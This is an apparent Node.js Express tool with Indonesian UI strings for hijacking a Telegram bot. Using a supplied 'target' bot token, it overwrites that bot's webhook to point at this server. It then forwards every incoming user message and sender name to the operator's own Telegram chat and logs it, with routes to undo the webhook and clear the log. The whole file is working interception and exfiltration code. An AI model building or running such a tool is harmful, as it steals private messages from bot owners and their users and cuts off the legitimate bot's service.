const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

let config = {};

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

app.post("/start", (req, res) => {
  const { tokenTarget, tokenKamu, idKamu } = req.body;

  if (!tokenTarget || !tokenKamu || !idKamu) {
    return res.status(400).json({ status: "❌ Semua kolom harus diisi!" });
  }

  config = { tokenTarget, tokenKamu, idKamu };

  const webhookUrl = `${req.protocol}://${req.get("host")}/webhook`;

  axios.post(`https://api.telegram.org/bot${tokenTarget}/setWebhook`, {
    url: webhookUrl,
  })
    .then(() => res.json({ status: "✅ Webhook berhasil diaktifkan!" }))
    .catch(err => res.status(500).json({ status: "❌ Gagal set webhook: " + err.message }));
});

app.post("/webhook", (req, res) => {
  const msg = req.body.message;
  if (!msg) return res.sendStatus(200);

  const text = `📩 Pesan:\n${msg.text || "[non-text]"}\n👤 Dari: ${msg.from.username || msg.from.first_name}`;

  axios.post(`https://api.telegram.org/bot${config.tokenKamu}/sendMessage`, {
    chat_id: config.idKamu,
    text,
  }).catch(console.error);

  fs.appendFileSync("log.txt", JSON.stringify(msg) + "\n");

  res.sendStatus(200);
});

app.post("/stop", (req, res) => {
  if (!config.tokenTarget) return res.json({ status: "❌ Tidak ada webhook aktif." });

  axios.post(`https://api.telegram.org/bot${config.tokenTarget}/deleteWebhook`)
    .then(() => res.json({ status: "🛑 Webhook dinonaktifkan." }))
    .catch(err => res.status(500).json({ status: "❌ Gagal hapus webhook: " + err.message }));
});

app.post("/hapus-log", (req, res) => {
  try {
    fs.writeFileSync("log.txt", "");
    res.json({ status: "🧹 Log berhasil dihapus." });
  } catch (e) {
    res.status(500).json({ status: "❌ Gagal hapus log: " + e.message });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});